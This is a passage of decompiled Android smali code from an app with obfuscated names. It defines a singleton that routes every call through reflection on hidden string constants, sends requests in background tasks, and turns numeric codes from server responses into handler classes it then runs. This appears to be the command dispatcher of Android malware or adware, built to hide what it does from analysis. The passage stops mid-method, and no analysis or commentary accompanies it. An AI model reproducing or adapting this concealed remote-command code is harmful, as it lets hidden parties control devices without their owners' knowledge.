.class final Lwvknbzh/mwrpxg/qpha/h;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lwvknbzh/mwrpxg/qpha/h$g;,
        Lwvknbzh/mwrpxg/qpha/h$e;,
        Lwvknbzh/mwrpxg/qpha/h$c;,
        Lwvknbzh/mwrpxg/qpha/h$f;,
        Lwvknbzh/mwrpxg/qpha/h$d;,
        Lwvknbzh/mwrpxg/qpha/h$b;,
        Lwvknbzh/mwrpxg/qpha/h$a;,
        Lwvknbzh/mwrpxg/qpha/h$h;
    }
.end annotation


# static fields
.field private static final b:Lwvknbzh/mwrpxg/qpha/h;

.field private static volatile h:Z


# instance fields
.field a:Z

.field private final c:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lwvknbzh/mwrpxg/qpha/h$h;",
            ">;"
        }
    .end annotation
.end field

.field private d:Ljava/lang/String;

.field private e:Ljava/lang/String;

.field private f:I

.field private g:Z

.field private final i:Landroid/util/SparseArray;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Landroid/util/SparseArray",
            "<",
            "Ljava/lang/Class",
            "<*>;>;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 30
    new-instance v0, Lwvknbzh/mwrpxg/qpha/h;

    invoke-direct {v0}, Lwvknbzh/mwrpxg/qpha/h;-><init>()V

    sput-object v0, Lwvknbzh/mwrpxg/qpha/h;->b:Lwvknbzh/mwrpxg/qpha/h;

    .line 37
    const/4 v0, 0x0

    sput-boolean v0, Lwvknbzh/mwrpxg/qpha/h;->h:Z

    return-void
.end method

.method private constructor <init>()V
    .locals 6

    .prologue
    const/4 v2, 0x0

    const/4 v1, 0x1

    .line 47
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 31
    new-instance v0, Ljava/util/concurrent/CopyOnWriteArrayList;

    invoke-direct {v0}, Ljava/util/concurrent/CopyOnWriteArrayList;-><init>()V

    iput-object v0, p0, Lwvknbzh/mwrpxg/qpha/h;->c:Ljava/util/List;

    .line 34
    iput v2, p0, Lwvknbzh/mwrpxg/qpha/h;->f:I

    .line 35
    iput-boolean v2, p0, Lwvknbzh/mwrpxg/qpha/h;->g:Z

    .line 39
    iput-boolean v1, p0, Lwvknbzh/mwrpxg/qpha/h;->a:Z

    .line 41
    new-instance v0, Landroid/util/SparseArray;

    invoke-direct {v0}, Landroid/util/SparseArray;-><init>()V

    iput-object v0, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    .line 50
    :try_start_0
    sget-object v0, Lwvknbzh/mwrpxg/qpha/a;->do:Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v0

    .line 51
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    sget-object v2, Lwvknbzh/mwrpxg/qpha/a;->be:Ljava/lang/String;

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    sget-object v5, Lwvknbzh/mwrpxg/qpha/a;->dt:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 52
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 54
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v4, Lwvknbzh/mwrpxg/qpha/a;->eu:Ljava/lang/String;

    aput-object v4, v2, v3

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 55
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-static {}, Lwvknbzh/mwrpxg/qpha/a;->a()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 56
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v4, Lwvknbzh/mwrpxg/qpha/a;->a:Ljava/lang/String;

    aput-object v4, v2, v3

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 58
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lwvknbzh/mwrpxg/qpha/h;->e:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    .line 62
    :goto_0
    invoke-static {}, Lwvknbzh/mwrpxg/qpha/c;->a()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lwvknbzh/mwrpxg/qpha/h;->d:Ljava/lang/String;

    .line 65
    :try_start_1
    iget-object v0, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    sget-object v1, Lwvknbzh/mwrpxg/qpha/a;->be:Ljava/lang/String;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    sget-object v4, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Ljava/lang/Object;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 66
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 68
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/4 v4, 0x2

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Lwvknbzh/mwrpxg/qpha/h$d;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 69
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/4 v4, 0x3

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Lwvknbzh/mwrpxg/qpha/h$f;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 70
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/16 v4, 0xb

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Lwvknbzh/mwrpxg/qpha/h$b;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 71
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/16 v4, 0x13

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Lwvknbzh/mwrpxg/qpha/h$c;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 72
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/16 v4, 0x15

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Lwvknbzh/mwrpxg/qpha/h$e;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 73
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/16 v4, 0x22

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Lwvknbzh/mwrpxg/qpha/h$g;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 77
    :goto_1
    return-void

    .line 75
    :catch_0
    move-exception v0

    goto :goto_1

    .line 60
    :catch_1
    move-exception v0

    goto/16 :goto_0
.end method

.method static a()Lwvknbzh/mwrpxg/qpha/h;
    .locals 1

    .prologue
    .line 44
    sget-object v0, Lwvknbzh/mwrpxg/qpha/h;->b:Lwvknbzh/mwrpxg/qpha/h;

    return-object v0
.end method

.method private a(ILjava/lang/String;)V
    .locals 6

    .prologue
    const/4 v3, 0x2

    const/4 v5, 0x0

    const/4 v4, 0x1

    .line 217
    new-instance v0, Lwvknbzh/mwrpxg/qpha/h$h;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Lwvknbzh/mwrpxg/qpha/h$h;-><init>(Lwvknbzh/mwrpxg/qpha/i;)V

    .line 218
    iput p1, v0, Lwvknbzh/mwrpxg/qpha/h$h;->d:I

    .line 220
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0xb

    if-lt v1, v2, :cond_0

    .line 221
    sget-object v1, Landroid/os/AsyncTask;->THREAD_POOL_EXECUTOR:Ljava/util/concurrent/Executor;

    new-array v2, v3, [Ljava/lang/String;

    invoke-direct {p0}, Lwvknbzh/mwrpxg/qpha/h;->c()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v5

    aput-object p2, v2, v4

    invoke-virtual {v0, v1, v2}, Lwvknbzh/mwrpxg/qpha/h$h;->executeOnExecutor(Ljava/util/concurrent/Executor;[Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 226
    :goto_0
    :try_start_0
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->c:Ljava/util/List;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    sget-object v2, Lwvknbzh/mwrpxg/qpha/a;->cU:Ljava/lang/String;

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    sget-object v5, Lwvknbzh/mwrpxg/qpha/a;->dv:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 227
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 228
    iget-object v2, p0, Lwvknbzh/mwrpxg/qpha/h;->c:Ljava/util/List;

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 231
    :goto_1
    return-void

    .line 223
    :cond_0
    new-array v1, v3, [Ljava/lang/String;

    invoke-direct {p0}, Lwvknbzh/mwrpxg/qpha/h;->c()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v1, v5

    aput-object p2, v1, v4

    invoke-virtual {v0, v1}, Lwvknbzh/mwrpxg/qpha/h$h;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_0

    .line 229
    :catch_0
    move-exception v0

    goto :goto_1
.end method

.method private c()Ljava/lang/String;
    .locals 2

    .prologue
    .line 80
    iget v0, p0, Lwvknbzh/mwrpxg/qpha/h;->f:I

    const/16 v1, 0xa

    if-le v0, v1, :cond_0

    .line 81
    const/4 v0, 0x0

    iput v0, p0, Lwvknbzh/mwrpxg/qpha/h;->f:I

    .line 83
    :cond_0
    iget-object v0, p0, Lwvknbzh/mwrpxg/qpha/h;->e:Ljava/lang/String;

    return-object v0
.end method


# virtual methods
.method a(ILjava/lang/Object;)V
    .locals 6

    .prologue
    const/4 v1, 0x1

    .line 189
    if-ne p1, v1, :cond_1

    .line 190
    sget-boolean v0, Lwvknbzh/mwrpxg/qpha/h;->h:Z

    if-eqz v0, :cond_0

    .line 213
    :goto_0
    return-void

    .line 191
    :cond_0
    sput-boolean v1, Lwvknbzh/mwrpxg/qpha/h;->h:Z

    .line 196
    :cond_1
    :try_start_0
    sget-object v0, Lwvknbzh/mwrpxg/qpha/a;->dD:Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 197
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v1

    .line 199
    sget-object v2, Lwvknbzh/mwrpxg/qpha/a;->bo:Ljava/lang/String;

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    sget-object v5, Lwvknbzh/mwrpxg/qpha/a;->dt:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    aput-object v5, v3, v4

    const/4 v4, 0x1

    sget-object v5, Lwvknbzh/mwrpxg/qpha/a;->dv:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 201
    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 203
    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v4, Lwvknbzh/mwrpxg/qpha/a;->ab:Ljava/lang/String;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    iget-object v4, p0, Lwvknbzh/mwrpxg/qpha/h;->d:Ljava/lang/String;

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 204
    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v4, Lwvknbzh/mwrpxg/qpha/a;->aa:Ljava/lang/String;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    aput-object p2, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 205
    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v4, Lwvknbzh/mwrpxg/qpha/a;->ac:Ljava/lang/String;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 207
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lwvknbzh/mwrpxg/qpha/c;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, p1, v0}, Lwvknbzh/mwrpxg/qpha/h;->a(ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 211
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method a(J)V
    .locals 13

    .prologue
    .line 96
    const/4 v0, 0x0

    .line 98
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h;->c:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    move v1, v0

    :cond_0
    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_e

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lwvknbzh/mwrpxg/qpha/h$h;

    .line 100
    iget v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->d:I

    const/4 v3, 0x1

    if-ne v2, v3, :cond_1

    const/4 v1, 0x1

    .line 102
    :cond_1
    invoke-virtual {v0}, Lwvknbzh/mwrpxg/qpha/h$h;->isCancelled()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 103
    iget-object v2, p0, Lwvknbzh/mwrpxg/qpha/h;->c:Ljava/util/List;

    invoke-interface {v2, v0}, Ljava/util/List;->remove(Ljava/lang/Object;)Z

    goto :goto_0

    .line 108
    :cond_2
    :try_start_0
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    sget-object v3, Lwvknbzh/mwrpxg/qpha/a;->bF:Ljava/lang/String;

    const/4 v5, 0x0

    new-array v5, v5, [Ljava/lang/Class;

    invoke-virtual {v2, v3, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v2, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    sget-object v3, Landroid/os/AsyncTask$Status;->FINISHED:Landroid/os/AsyncTask$Status;

    invoke-virtual {v2, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_3

    iget-boolean v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->e:Z

    if-eqz v2, :cond_c

    .line 110
    :cond_3
    iget-object v2, p0, Lwvknbzh/mwrpxg/qpha/h;->c:Ljava/util/List;

    invoke-interface {v2, v0}, Ljava/util/List;->remove(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    .line 112
    :try_start_1
    iget-boolean v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->e:Z

    if-nez v2, :cond_4

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Lwvknbzh/mwrpxg/qpha/h$h;->cancel(Z)Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_4

    .line 116
    :cond_4
    :goto_1
    :try_start_2
    iget v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->c:I

    if-eqz v2, :cond_5

    iget v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->c:I

    const/16 v3, 0xc8

    if-eq v2, v3, :cond_9

    .line 117
    :cond_5
    iget v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->d:I

    const/4 v3, 0x2

    if-eq v2, v3, :cond_6

    iget v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->d:I

    const/4 v3, 0x5

    if-ne v2, v3, :cond_0

    .line 120
    :cond_6
    iget v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->d:I
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_8

    .line 121
    const/4 v1, 0x0

    move v2, v1

    .line 127
    :goto_2
    :try_start_3
    invoke-virtual {v0}, Lwvknbzh/mwrpxg/qpha/h$h;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_3

    .line 128
    if-eqz v0, :cond_b

    .line 132
    :try_start_4
    sget-object v1, Lwvknbzh/mwrpxg/qpha/a;->dC:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v5, 0x0

    sget-object v6, Lwvknbzh/mwrpxg/qpha/a;->dt:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    aput-object v6, v3, v5

    invoke-virtual {v1, v3}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v1

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v5, 0x0

    invoke-static {v0}, Lwvknbzh/mwrpxg/qpha/c;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v3, v5

    invoke-virtual {v1, v3}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    .line 135
    const/4 v0, 0x0

    move v3, v0

    :goto_3
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    sget-object v1, Lwvknbzh/mwrpxg/qpha/a;->bg:Ljava/lang/String;

    const/4 v6, 0x0

    new-array v6, v6, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Object;

    invoke-virtual {v0, v5, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    if-ge v3, v0, :cond_b

    .line 137
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    sget-object v1, Lwvknbzh/mwrpxg/qpha/a;->cf:Ljava/lang/String;

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Class;

    const/4 v7, 0x0

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v7

    invoke-virtual {v0, v1, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v6, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    aput-object v7, v1, v6

    invoke-virtual {v0, v5, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    .line 139
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    sget-object v1, Lwvknbzh/mwrpxg/qpha/a;->cg:Ljava/lang/String;

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Class;

    const/4 v8, 0x0

    sget-object v9, Lwvknbzh/mwrpxg/qpha/a;->dt:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v9

    aput-object v9, v7, v8

    invoke-virtual {v0, v1, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 140
    const/4 v0, 0x1

    invoke-virtual {v1, v0}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 142
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    sget-object v7, Lwvknbzh/mwrpxg/qpha/a;->cf:Ljava/lang/String;

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Class;

    const/4 v9, 0x0

    sget-object v10, Lwvknbzh/mwrpxg/qpha/a;->dt:Ljava/lang/String;

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    aput-object v10, v8, v9

    invoke-virtual {v0, v7, v8}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    .line 143
    const/4 v0, 0x1

    invoke-virtual {v7, v0}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 145
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v8, 0x0

    sget-object v9, Lwvknbzh/mwrpxg/qpha/a;->ad:Ljava/lang/String;

    aput-object v9, v0, v8

    invoke-virtual {v1, v6, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_0

    move-result v8

    .line 147
    if-nez v8, :cond_a

    .line 135
    :cond_7
    :goto_4
    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto/16 :goto_3

    .line 123
    :cond_8
    :try_start_5
    iget v2, v0, Lwvknbzh/mwrpxg/qpha/h$h;->d:I

    iget-object v3, v0, Lwvknbzh/mwrpxg/qpha/h$h;->a:Ljava/lang/String;

    invoke-direct {p0, v2, v3}, Lwvknbzh/mwrpxg/qpha/h;->a(ILjava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_2

    :cond_9
    move v2, v1

    goto/16 :goto_2

    .line 149
    :cond_a
    :try_start_6
    iget-object v0, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    sget-object v9, Lwvknbzh/mwrpxg/qpha/a;->bG:Ljava/lang/String;

    const/4 v10, 0x1

    new-array v10, v10, [Ljava/lang/Class;

    const/4 v11, 0x0

    sget-object v12, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v12, v10, v11

    invoke-virtual {v0, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    iget-object v9, p0, Lwvknbzh/mwrpxg/qpha/h;->i:Landroid/util/SparseArray;

    const/4 v10, 0x1

    new-array v10, v10, [Ljava/lang/Object;

    const/4 v11, 0x0

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v12

    aput-object v12, v10, v11

    invoke-virtual {v0, v9, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Class;

    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lwvknbzh/mwrpxg/qpha/h$a;

    check-cast v0, Lwvknbzh/mwrpxg/qpha/h$a;

    .line 151
    if-eqz v0, :cond_7

    .line 153
    iput v8, v0, Lwvknbzh/mwrpxg/qpha/h$a;->b:I

    .line 154
    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    sget-object v10, Lwvknbzh/mwrpxg/qpha/a;->al:Ljava/lang/String;

    aput-object v10, v8, v9

    invoke-virtual {v1, v6, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

